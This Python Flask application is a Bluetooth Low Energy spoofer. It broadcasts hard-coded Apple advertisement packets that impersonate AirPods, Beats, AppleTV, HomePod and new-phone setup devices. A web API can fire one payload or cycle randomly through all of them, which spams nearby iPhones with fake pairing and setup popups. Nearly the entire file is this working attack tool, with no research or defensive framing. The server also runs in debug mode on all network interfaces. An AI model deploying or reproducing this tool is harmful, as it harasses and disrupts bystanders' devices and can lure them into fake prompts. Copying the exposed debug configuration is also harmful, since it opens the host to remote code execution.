#!/usr/bin/python3
from flask import Flask, render_template, jsonify, request
import random
import sys
import time
import threading
import logging
from logging.handlers import RotatingFileHandler

try:
    import bluetooth._bluetooth as bluez
except ImportError:
    print("The bluetooth library is not installed. Please install it using 'pip install pybluez'.")
    sys.exit(1)

try:
    from utils.bluetooth_utils import toggle_device, start_le_advertising, stop_le_advertising
except ImportError:
    print("The utils.bluetooth_utils module is not found. Please ensure it is in your PYTHONPATH.")
    sys.exit(1)


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        RotatingFileHandler('spoofer.log', maxBytes=1000000, backupCount=5),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)


bt_data_options = {
    1: "Airpods",
    2: "Airpods Pro",
    3: "Airpods Max",
    4: "Airpods Gen 2",
    5: "Airpods Gen 3",
    6: "Airpods Pro Gen 2",
    7: "PowerBeats",
    8: "PowerBeats Pro",
    9: "Beats Solo Pro",
    10: "Beats Studio Buds",
    11: "Beats Flex",
    12: "BeatsX",
    13: "Beats Solo3",
    14: "Beats Studio3",
    15: "Beats Studio Pro",
    16: "Beats Fit Pro",
    17: "Beats Studio Buds+",
    18: "AppleTV Setup",
    19: "AppleTV Pair",
    20: "AppleTV New User",
    21: "AppleTV AppleID Setup",
    22: "AppleTV Wireless Audio Sync",
    23: "AppleTV Homekit Setup",
    24: "AppleTV Keyboard",
    25: "AppleTV 'Connecting to Network'",
    26: "Homepod Setup",
    27: "Setup New Phone",
    28: "Transfer Number to New Phone",
    29: "TV Color Balance"
}

hex_data = {
    1: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    2: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    3: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    4: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    5: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    6: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    7: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    8: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    9: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    10: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    11: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    12: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    13: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    14: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    15: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    16: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    17: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    18: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    19: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    20: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    21: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    22: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    23: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    24: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    25: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    26: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    27: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    28: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    29: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00)
}


advertising = False
sock = None
random_thread = None
current_data = None
lock = threading.Lock()

def initialize_bluetooth():
    max_retries = 3
    for attempt in range(max_retries):
        try:
            toggle_device(0, True)
            sock = bluez.hci_open_dev(0)
            logger.info("Bluetooth initialized successfully")
            return sock
        except Exception as e:
            logger.error(f"Bluetooth initialization attempt {attempt + 1} failed: {e}")
            time.sleep(1)
    logger.critical("Failed to initialize Bluetooth after %d attempts", max_retries)
    sys.exit(1)

sock = initialize_bluetooth()

@app.route('/')
def index():
    return render_template('index.html', bt_data_options=bt_data_options)

@app.route('/api/start', methods=['POST'])
def start_advertising():
    global advertising, random_thread, current_data
    data = request.json
    option = data.get('option')
    interval = data.get('interval', 200)
    is_random = data.get('random', False)


    if not isinstance(interval, int) or interval < 100:
        logger.warning("Invalid interval: %s", interval)
        return jsonify({'status': 'error', 'message': 'Interval must be an integer >= 100 ms'}), 400

    with lock:
        if advertising:
            logger.warning("Advertising already in progress")
            return jsonify({'status': 'error', 'message': 'Advertising already in progress'}), 400

        if not is_random and (not option or int(option) not in bt_data_options):
            logger.warning("Invalid or no option selected: %s", option)
            return jsonify({'status': 'error', 'message': 'Invalid or no option selected'}), 400

        advertising = True

    def random_advertising():
        global advertising, current_data
        while advertising:
            with lock:
                if not advertising:
                    break
                selected_option = random.choice(list(bt_data_options.keys()))
                current_data = {'option': selected_option, 'data': hex_data[selected_option]}
            try:
                start_le_advertising(sock, adv_type=0x03, min_interval=interval, max_interval=interval, data=hex_data[selected_option])
                logger.info("Advertising %s", bt_data_options[selected_option])
                time.sleep(interval / 1000)
                stop_le_advertising(sock)
            except Exception as e:
                logger.error("Error in random advertising: %s", e)
                with lock:
                    advertising = False
                    stop_le_advertising(sock)
                return

    try:
        if is_random:
            random_thread = threading.Thread(target=random_advertising)
            random_thread.daemon = True  
            random_thread.start()
            logger.info("Random advertising started")
            return jsonify({'status': 'success', 'message': 'Random advertising started'})
        else:
            selected_option = int(option)
            with lock:
                current_data = {'option': selected_option, 'data': hex_data[selected_option]}
            start_le_advertising(sock, adv_type=0x03, min_interval=interval, max_interval=interval, data=hex_data[selected_option])
            logger.info("Advertising started for %s", bt_data_options[selected_option])
            return jsonify({'status': 'success', 'message': f'Advertising started for {bt_data_options[selected_option]}'})
    except Exception as e:
        logger.error("Error starting advertising: %s", e)
        with lock:
            advertising = False
            stop_le_advertising(sock)
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/stop', methods=['POST'])
def stop_advertising():
    global advertising, random_thread, current_data
    with lock:
        if not advertising:
            logger.warning("Stop requested but not advertising")
            return jsonify({'status': 'error', 'message': 'Not advertising'}), 400

        advertising = False
        stop_le_advertising(sock)
        random_thread = None
        current_data = None
    logger.info("Advertising stopped")
    return jsonify({'status': 'success', 'message': 'Advertising stopped'})

@app.route('/api/status', methods=['GET'])
def get_status():
    with lock:
        if advertising and current_data:
            hex_str = ' '.join([f'{x:02x}' for x in current_data['data']])
            return jsonify({
                'status': 'advertising',
                'option': current_data['option'],
                'data_name': bt_data_options[current_data['option']],
                'hex_data': hex_str
            })
    return jsonify({'status': 'idle'})

@app.route('/shutdown', methods=['POST'])
def shutdown():
    with lock:
        global advertising, sock
        if advertising:
            stop_le_advertising(sock)
            advertising = False
        if sock:
            sock.close()
    logger.info("Server shutting down")
    func = request.environ.get('werkzeug.server.shutdown')
    if func:
        func()
    return jsonify({'status': 'success', 'message': 'Server shutting down'})

if __name__ == '__main__':
    try:
        app.run(debug=True, host='0.0.0.0', port=5000)
    except KeyboardInterrupt:
        logger.info("Received KeyboardInterrupt, shutting down")
        with lock:
            if advertising:
                stop_le_advertising(sock)
            if sock:
                sock.close()
        logger.info("Server stopped")